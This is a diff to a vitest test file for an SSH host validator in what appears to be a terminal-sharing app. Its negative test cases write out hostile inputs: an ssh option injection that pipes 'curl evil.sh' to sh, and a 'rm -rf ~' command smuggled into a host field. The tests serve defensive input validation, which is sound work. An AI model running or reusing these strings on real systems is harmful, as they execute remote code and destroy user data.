@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { ACCESS_COPY, authorizedKeyLine, connectCommand, looksLikePublicKey, tmuxName } from "./sshShare";
+import { ACCESS_COPY, authorizedKeyLine, connectCommand, looksLikePublicKey, looksLikeSshHost, teammateHosts, tmuxName } from "./sshShare";
 
 const KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJx5Q2v8bW9yZXN0dWZmaGVyZQ== aryan@mac";
 
@@ -95,5 +95,33 @@ describe("what each level actually grants, verified against tmux 3.5a", () => {
   it("watch-only copy does not overclaim either", () => {
     expect(ACCESS_COPY.watch.detail).toMatch(/read-only/i);
     expect(ACCESS_COPY.watch.detail).not.toMatch(/shell on your Mac/i);
+  });
+});
+
+describe("connecting to their Mac", () => {
+  it("refuses a host ssh would read as an option — the one that matters", () => {
+    expect(looksLikeSshHost("-oProxyCommand=curl evil.sh|sh")).toBe(false);
+    expect(looksLikeSshHost("host; rm -rf ~")).toBe(false);
+    expect(looksLikeSshHost("host and more")).toBe(false);
+    expect(looksLikeSshHost("")).toBe(false);
+  });
+
+  it("accepts what people actually type", () => {
+    expect(looksLikeSshHost("aryan@macbook.local")).toBe(true);
+    expect(looksLikeSshHost("macbook-air.tail7a41d0.ts.net")).toBe(true);
+    expect(looksLikeSshHost("  nandan@192.168.1.4  ")).toBe(true);
+  });
+
+  it("reads back only usable hosts, ignoring junk in the blob", () => {
+    expect(teammateHosts({ teammateHosts: { m1: "a@b", m2: "  ", m3: 7 } })).toEqual({ m1: "a@b" });
+    expect(teammateHosts(undefined)).toEqual({});
+    expect(teammateHosts({ teammateHosts: ["nope"] })).toEqual({});
+  });
+
+  it("the tmux name is derived from their session, never typed", () => {
+    // a typo here attaches to a session that does not exist and shows an empty
+    // terminal with no error — the worst failure mode this feature has
+    expect(tmuxName("me")).toBe("grillme-me");
+    expect(tmuxName("s2")).toBe("grillme-s2");
   });
 });
